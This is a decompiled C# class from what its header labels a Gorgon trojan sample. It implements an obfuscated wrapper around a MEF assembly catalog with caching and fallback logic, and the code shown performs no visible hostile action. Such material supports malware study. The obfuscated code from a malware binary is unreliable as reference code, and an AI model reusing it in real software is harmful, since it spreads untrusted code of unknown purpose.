// Decompiled with JetBrains decompiler
// Type: 4zrRrwu.19427NS
// Assembly: gO77Fih, Version=16.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a
// MVID: F43F05C3-DF79-4EF2-8C94-619BF1ED6D3E
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.MSIL.Gorgon.gen-83f6c309f411e1aebbdf75c62f67f163231f1b0ee065936230741272cda1cb9a.exe

using \u0032TZs6tE;
using \u0035kbAcwV;
using \u00366N2IhJ;
using \u0037h0JAji;
using \u0039XQfkTy;
using Di3tgNX;
using HXyvsEW;
using jz0haJe;
using li9OdoS;
using odRvpaC;
using R4qHaNR;
using System;
using System.Collections.Generic;
using System.ComponentModel.Composition.Hosting;
using System.ComponentModel.Composition.Primitives;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Threading;
using ThTI8Bk;
using U8zsCil;
using ui2f5w0;
using Wou4xum;
using ydtGGRz;

namespace \u0034zrRrwu
{
  internal class \u00319427NS : 
    ComposablePartCatalog,
    ICachedComposablePartCatalog,
    ICompositionElement
  {
    private ComposablePartCatalog EEjf75b;
    private gzMilTR czKxV72;
    private bool hLjOLxj;
    private volatile int HOYYAeS;
    private Assembly hWGBX8h;
    private jUU2Be4 h5PnTpr;
    private bool tWQQBm0;
    private string WlTw7Pf;
    private string TQHKvjH;
    private IDictionary<ComposablePartDefinition, \u0036ag9UIM> QDjtOiK;

    public \u00319427NS(
      string codeBase,
      jUU2Be4 host,
      IDictionary<ComposablePartDefinition, \u0036ag9UIM> partReferenceMap)
    {
      EtgLXvM.IgtuOaH(codeBase, nameof (codeBase));
      EtgLXvM.JHnzRk1<jUU2Be4>(host, nameof (host));
      EtgLXvM.JHnzRk1<IDictionary<ComposablePartDefinition, \u0036ag9UIM>>(partReferenceMap, nameof (partReferenceMap));
      this.QDjtOiK = partReferenceMap;
      this.h5PnTpr = host;
      AssemblyCatalog assemblyCatalog = new AssemblyCatalog(codeBase);
      this.hWGBX8h = assemblyCatalog.Assembly;
      this.DbdZYRT = (ComposablePartCatalog) assemblyCatalog;
      this.hLjOLxj = false;
      this.WlTw7Pf = codeBase;
      this.TQHKvjH = this.nsostnW.GetName().FullName;
    }

    public \u00319427NS(
      U3VYzxU cache,
      jUU2Be4 host,
      IDictionary<ComposablePartDefinition, \u0036ag9UIM> partReferenceMap)
    {
      EtgLXvM.JHnzRk1<U3VYzxU>(cache, nameof (cache));
      EtgLXvM.JHnzRk1<jUU2Be4>(host, nameof (host));
      EtgLXvM.JHnzRk1<IDictionary<ComposablePartDefinition, \u0036ag9UIM>>(partReferenceMap, nameof (partReferenceMap));
      this.QDjtOiK = partReferenceMap;
      this.h5PnTpr = host;
      Q3QfRgO.CYK6tK8<IDictionary<string, object>>(cache.\u0038fsmsSf);
      IDictionary<string, object> dictionary = cache.\u0038fsmsSf.eguvZws<object>("Assembly");
      Q3QfRgO.CYK6tK8<IDictionary<string, object>>(dictionary);
      this.WlTw7Pf = dictionary.O2sGFwD<string>("Location");
      Q3QfRgO.oHJj1LF(this.WlTw7Pf);
      this.TQHKvjH = dictionary.O2sGFwD<string>("FullName");
      Q3QfRgO.oHJj1LF(this.TQHKvjH);
      if (cache.XFdNxOf())
      {
        this.czKxV72 = gzMilTR.NTTE7I6(cache.\u0038fsmsSf);
        this.DbdZYRT = cache.gAF2jn6((ICachedComposablePartCatalogSite) PjYgQoE.XaTb7Qf((Func<Assembly>) (() => this.nsostnW)));
        this.hLjOLxj = true;
      }
      else
      {
        this.DbdZYRT = (ComposablePartCatalog) new AssemblyCatalog(cache.\u0038fsmsSf.sTIdWju());
        this.hLjOLxj = false;
      }
    }

    public IDictionary<ComposablePartDefinition, \u0036ag9UIM> UtxM8EG
    {
      get
      {
        if (this.QDjtOiK == null)
          this.QDjtOiK = (IDictionary<ComposablePartDefinition, \u0036ag9UIM>) new Dictionary<ComposablePartDefinition, \u0036ag9UIM>();
        return this.QDjtOiK;
      }
      set => this.QDjtOiK = value;
    }

    public IEnumerable<int> \u0035fV3fk2 => this.hLjOLxj ? (IEnumerable<int>) this.czKxV72.AZzDpaF : MLRjbIR.lC5UII5((IEnumerable<ComposablePartDefinition>) this.EEjf75b);

    public ComposablePartCatalog DbdZYRT
    {
      get => this.EEjf75b;
      set
      {
        if (value is AssemblyCatalog assemblyCatalog)
          this.hWGBX8h = assemblyCatalog.Assembly;
        this.EEjf75b = value;
      }
    }

    public bool WN3EAsL
    {
      get
      {
        this.Ii56GX0();
        return this.tWQQBm0;
      }
    }

    public bool QtDh7PX
    {
      get
      {
        this.Ii56GX0();
        return this.tWQQBm0 || this.hLjOLxj;
      }
    }

    string ICompositionElement.qlr6vro => this.GetType().Name;

    ICompositionElement ICompositionElement.qu8u2Fx => (ICompositionElement) null;

    public Assembly nsostnW
    {
      get
      {
        if (this.hWGBX8h == (Assembly) null)
        {
          Q3QfRgO.CYK6tK8<gzMilTR>(this.czKxV72);
          Assembly assembly = this.czKxV72.XI0oj3P();
          Thread.MemoryBarrier();
          this.hWGBX8h = assembly;
        }
        return this.hWGBX8h;
      }
    }

    public virtual IQueryable<ComposablePartDefinition> e4WWxPA
    {
      get
      {
        this.Ii56GX0();
        if (!this.tWQQBm0)
        {
          try
          {
            return this.DbdZYRT.Parts;
          }
          catch (Exception ex)
          {
            U1j2scS.CJDYFbi(this.h5PnTpr, ex, this.WlTw7Pf);
          }
          if (this.hLjOLxj)
          {
            try
            {
              this.N4q3aps();
              return this.DbdZYRT.Parts;
            }
            catch (Exception ex)
            {
              U1j2scS.CJDYFbi(this.h5PnTpr, ex, this.WlTw7Pf);
            }
          }
          this.tWQQBm0 = true;
        }
        return Enumerable.Empty<ComposablePartDefinition>().AsQueryable<ComposablePartDefinition>();
      }
    }

    internal string \u00322KBrEi => this.WlTw7Pf;

    internal string UzhoWsk => this.TQHKvjH;

    public virtual IEnumerable<Tuple<ComposablePartDefinition, ExportDefinition>> IINd8g5(
      ImportDefinition lkBvoU3)
    {
      this.Ii56GX0();
      EtgLXvM.JHnzRk1<ImportDefinition>(lkBvoU3, "definition");
      if (!this.tWQQBm0)
      {
        try
        {
          return this.DbdZYRT.GetExports(lkBvoU3);
        }
        catch (Exception ex)
        {
          U1j2scS.CJDYFbi(this.h5PnTpr, ex, this.WlTw7Pf);
        }
        if (this.hLjOLxj)
        {
          try
          {
            this.N4q3aps();
            return this.DbdZYRT.GetExports(lkBvoU3);
          }
          catch (Exception ex)
          {
            U1j2scS.CJDYFbi(this.h5PnTpr, ex, this.WlTw7Pf);
          }
        }
        this.tWQQBm0 = true;
      }
      return Enumerable.Empty<Tuple<ComposablePartDefinition, ExportDefinition>>();
    }

    public object AgDZmBE(MyzKvwp DBcpxsh)
    {
      this.Ii56GX0();
      EtgLXvM.JHnzRk1<MyzKvwp>(DBcpxsh, "writer");
      if (this.tWQQBm0)
        return (object) null;
      ComposablePartCatalog dbdZyrt;
      IDictionary<string, object> Y8j1WO0;
      try
      {
        if (this.hLjOLxj)
        {
          dbdZyrt = this.DbdZYRT;
          Q3QfRgO.CYK6tK8<gzMilTR>(this.czKxV72);
          Y8j1WO0 = this.czKxV72.nFxHzFe();
        }
        else
        {
          dbdZyrt = this.DbdZYRT;
          Q3QfRgO.CYK6tK8<ComposablePartCatalog>(dbdZyrt);
          Q3QfRgO.oHJj1LF(this.WlTw7Pf);
          Assembly nsostnW = this.nsostnW;
          int hashCode = StringComparer.OrdinalIgnoreCase.GetHashCode(nsostnW.GetName().Name);
          IEnumerable<int> ints = ((IEnumerable<AssemblyName>) nsostnW.GetReferencedAssemblies()).Select<AssemblyName, int>((Func<AssemblyName, int>) (IdK0UWz => StringComparer.OrdinalIgnoreCase.GetHashCode(IdK0UWz.Name)));
          IEnumerable<int> list = (IEnumerable<int>) this.\u0035fV3fk2.ToList<int>();
          string location = nsostnW.Location;
          long num1 = 0;
          if (!string.Equals(location, this.WlTw7Pf, StringComparison.OrdinalIgnoreCase) && File.Exists(location))
            num1 = File.GetLastWriteTimeUtc(location).Ticks;
          string wlTw7Pf = this.WlTw7Pf;
          long ticks = File.GetLastWriteTimeUtc(this.WlTw7Pf).Ticks;
          int num2 = hashCode;
          string fullName = nsostnW.GetName().FullName;
          long num3 = ticks;
          int oP2GAIz = num2;
          string GhyEPLQ = location;
          long DlGNKwT = num1;
          IEnumerable<int> MQwu7Zi = ints;
          IEnumerable<int> cy2S07B = list;
          Y8j1WO0 = \u0036HFRYLK.FpYE6em(wlTw7Pf, fullName, num3, oP2GAIz, GhyEPLQ, DlGNKwT, MQwu7Zi, cy2S07B);
        }
      }
      catch (Exception ex)
      {
        U1j2scS.CJDYFbi(this.h5PnTpr, ex, this.WlTw7Pf);
        return (object) null;
      }
      object cku1C4V = DBcpxsh.iW1Vugx(dbdZyrt, Y8j1WO0, (ICachedComposablePartCatalogSite) PjYgQoE.\u0030U0oPU9());
      DBcpxsh.Tbwhr28(cku1C4V);
      return cku1C4V;
    }

    public virtual string f2cGGw0() => ((ICompositionElement) this).DisplayName;

    internal ComposablePartCatalog UpfTGHK() => this.DbdZYRT;

    protected override void Dispose(bool disposing)
    {
      if (disposing && Interlocked.CompareExchange(ref this.HOYYAeS, 1, 0) == 0)
        this.DbdZYRT.Dispose();
      base.Dispose(disposing);
    }

    private void Ii56GX0()
    {
      if (this.HOYYAeS == 1)
        throw new ObjectDisposedException(this.GetType().ToString());
    }

    private void N4q3aps()
    {
      this.h5PnTpr.\u00340C4Zbq(\u0037jxjFzS.Warning, MykOU9k.oyn5QbF, this.WlTw7Pf);
      if (this.DbdZYRT != null)
        this.DbdZYRT.Dispose();
      this.DbdZYRT = (ComposablePartCatalog) new AssemblyCatalog(this.nsostnW);
      this.hLjOLxj = false;
    }
  }
}
